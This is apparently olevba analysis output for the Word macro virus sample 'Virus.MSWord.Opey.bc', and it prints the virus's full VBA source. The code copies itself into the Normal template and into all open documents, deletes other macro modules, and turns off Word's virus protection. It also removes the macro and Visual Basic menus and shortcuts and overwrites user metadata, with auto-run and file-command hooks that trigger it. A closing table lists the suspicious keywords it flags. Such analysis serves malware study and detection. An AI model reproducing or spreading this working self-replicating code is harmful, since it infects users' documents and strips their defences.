olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.bc-676fcc596ef7e35aebe6caf5318fa1c075195d8a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.bc-676fcc596ef7e35aebe6caf5318fa1c075195d8a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Macro_Deist.bas 
in file: Virus.MSWord.Opey.bc-676fcc596ef7e35aebe6caf5318fa1c075195d8a - OLE stream: 'Macros/VBA/Macro_Deist'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub DeistProtect()

On Error Resume Next
    
Dim DocuName$, OpenDocDeistProtectd As Boolean
Dim E%, A%, NmDeistProtectd As Boolean
    
NmDeistProtectd = False
For E = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
DocuName = NormalTemplate.VBProject.VBComponents(E).Name
If DocuName = "Macro_Deist" Then NmDeistProtectd = True
If (DocuName <> "Macro_Deist") And _
(DocuName <> "ThisDocument") Then
Application.OrganizerDelete _
Source:=NormalTemplate.FullName _
, Name:=DocuName _
, Object:=wdOrganizerObjectProjectItems
End If
        
Next E
    
For Each openDoc In Documents
OpenDocDeistProtectd = False
With openDoc
For A = openDoc.VBProject.VBComponents.Count To 1 Step -1
DocuName = openDoc.VBProject.VBComponents(A).Name
If DocuName = "Macro_Deist" Then OpenDocDeistProtectd = True
If (DocuName <> "Macro_Deist") And _
(DocuName <> "ThisDocument") And _
(DocuName <> "Reference to Normal") Then
Application.OrganizerDelete Source:=openDoc.FullName _
, Name:=DocuName _
, Object:=wdOrganizerObjectProjectItems
End If

Next A
       
If Not OpenDocDeistProtectd Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=openDoc.FullName, _
Name:="Macro_Deist", _
Object:=wdOrganizerObjectProjectItems
openDoc.SaveAs FileName:=openDoc.FullName
End If
End With
Next openDoc
    
If Not NmDeistProtectd Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="Macro_Deist", _
Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End If

End Sub
Sub Initialize()

On Error Resume Next
Application.DisplayAlerts = wdAlertsAll
WordBasic.DisableAutoMacros -1
   
With Application
.UserName = "Erwin Deist Audine"
.UserAddress = "deist_ea36@yahoo.com"
.UserInitials = "EA36"
End With
         
With Dialogs(wdDialogFileSummaryInfo)
.Title = "Deist Modular Guardian"
.Subject = "Viral Immunization"
.Author = "Erwin Deist Audine"
.Keywords = "deist(L)ea36"
.Comments = "Note: The controls Macro and Customize are disabled to ensure your documents protection. This document guardian is dedicated to the men and women of SJA Batch '94 and to all of my friends. Thanks for keeping the little ember of ethereal fire burning ..."
.Execute
End With

With Options
.ConfirmConversions = True
.VirusProtection = False
.SaveNormalPrompt = False
End With
    
With ActiveDocument
.ReadOnlyRecommended = False
End With
    
With CommandBars("Visual Basic")
.Enabled = False
.Protection = msoBarTypeMenuBar
.Protection = msoBarMenuBar
End With

With CommandBars("Tools")
.reset
.Controls("Macro").Clear
.Controls("Customize...").Delete
End With
   
With CommandBars("Macro")
.Controls("Macros...").Delete
.Controls("Record New Macro...").Delete
.Controls("Visual Basic Editor").Delete
End With

CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable


End Sub
Sub FileSave()
On Error Resume Next
Call Initialize
Call DeistProtect
ActiveDocument.Save
End Sub
Sub FileClose()
On Error Resume Next
Call Initialize
Call DeistProtect
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
Call Initialize
Call DeistProtect
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
Call Initialize
Call DeistProtect
Dialogs(wdDialogFileNew).Show
Call DeistProtect
End Sub
Sub AutoOpen()
On Error Resume Next
Call Initialize
Call DeistProtect
End Sub
Sub AutoExec()
On Error Resume Next
Call Initialize
Call DeistProtect
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Initialize
Call DeistProtect
Dialogs(wdDialogFileSaveAs).Show
Call DeistProtect
End Sub
Sub FileOpen()
On Error Resume Next
Call Initialize
Call DeistProtect
Dialogs(wdDialogFileOpen).Show
Call DeistProtect
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

